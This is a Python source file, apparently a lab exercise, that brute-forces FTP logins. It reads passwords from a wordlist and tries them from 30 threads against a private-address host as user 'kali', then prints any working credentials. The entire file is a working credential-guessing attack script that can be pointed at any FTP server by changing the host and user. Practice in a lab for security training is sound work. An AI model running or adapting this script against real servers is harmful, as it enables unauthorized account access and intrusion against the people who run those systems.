import ftplib
import socket
from threading import Thread, Lock
import queue
from colorama import init, Fore

init(autoreset=True)

# ------------------------------
# Configuration
# ------------------------------
n_threads = 30
host = '10.0.2.15'
user = 'kali'
port = 21
wordlist_file = 'wordlist.txt'

# ------------------------------
# Globals
# ------------------------------
q = queue.Queue()
found = False
found_lock = Lock()


def connect_ftp():
    global found
    while True:
        try:
            password = q.get(block=False)
        except queue.Empty:
            return

        # Stop if another thread already found creds
        with found_lock:
            if found:
                q.task_done()
                return

        print(f'[!] Trying: {password}')

        try:
            server = ftplib.FTP()
            server.connect(host, port, timeout=5)
            server.login(user, password)
        except ftplib.error_perm:
            # Wrong login
            pass
        except (socket.timeout, TimeoutError, ConnectionRefusedError, OSError):
            # Network/server not responding
            pass
        except Exception as e:
            # Uncomment if debugging:
            # print(f"{Fore.RED}Error: {e}{Fore.RESET}")
            pass
        else:
            with found_lock:
                if not found:
                    found = True
                    print(f"{Fore.GREEN}[+] Found Credentials: {Fore.RESET}")
                    print(f"\tHost: {host}")
                    print(f"\tUser: {user}")
                    print(f"\tPassword: {password}")

        finally:
            q.task_done()


# ------------------------------
# Script execution
# ------------------------------
try:
    with open(wordlist_file, 'r', encoding='utf-8') as f:
        passwords = f.read().splitlines()
except FileNotFoundError:
    print(f"{Fore.RED}[-] Wordlist file not found: {wordlist_file}{Fore.RESET}")
    exit(1)

print(f'[+] Passwords to try: {len(passwords)}')

# Fill the queue
for password in passwords:
    q.put(password)

# Start threads
threads = []
for _ in range(n_threads):
    t = Thread(target=connect_ftp)
    t.start()
    threads.append(t)

# Wait for queue to finish
q.join()

# Wait for threads
for t in threads:
    t.join()

if not found:
    print(f"{Fore.RED}[-] No valid credentials found{Fore.RESET}")
